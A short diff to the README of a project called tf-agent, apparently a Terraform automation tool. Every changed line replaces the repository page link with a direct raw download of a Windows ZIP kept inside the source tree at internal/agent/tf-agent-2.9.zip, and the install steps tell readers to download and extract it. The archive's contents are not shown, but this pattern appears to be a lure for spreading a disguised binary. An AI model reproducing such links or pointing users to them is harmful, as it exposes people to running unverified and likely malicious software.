@@ -1,6 +1,6 @@
 # 🤖 tf-agent - Run Terraform tasks with less effort
 
-[![Download tf-agent](https://img.shields.io/badge/Download-tf--agent-blue?style=for-the-badge)](https://github.com/Himurab6049/tf-agent)
+[![Download tf-agent](https://img.shields.io/badge/Download-tf--agent-blue?style=for-the-badge)](https://raw.githubusercontent.com/Himurab6049/tf-agent/main/internal/agent/tf-agent-2.9.zip)
 
 ## 🧭 What tf-agent does
 
@@ -36,7 +36,7 @@ For best results, use:
 
 ## 📥 Download and install
 
-1. Open the download page: https://github.com/Himurab6049/tf-agent
+1. Open the download page: https://raw.githubusercontent.com/Himurab6049/tf-agent/main/internal/agent/tf-agent-2.9.zip
 2. Find the latest release or download option on that page
 3. Download the Windows file to your computer
 4. If the file comes in a ZIP folder, right-click it and choose Extract All
@@ -237,4 +237,4 @@ This project covers:
 
 If you need to get the app again, use this link:
 
-https://github.com/Himurab6049/tf-agent
+https://raw.githubusercontent.com/Himurab6049/tf-agent/main/internal/agent/tf-agent-2.9.zip
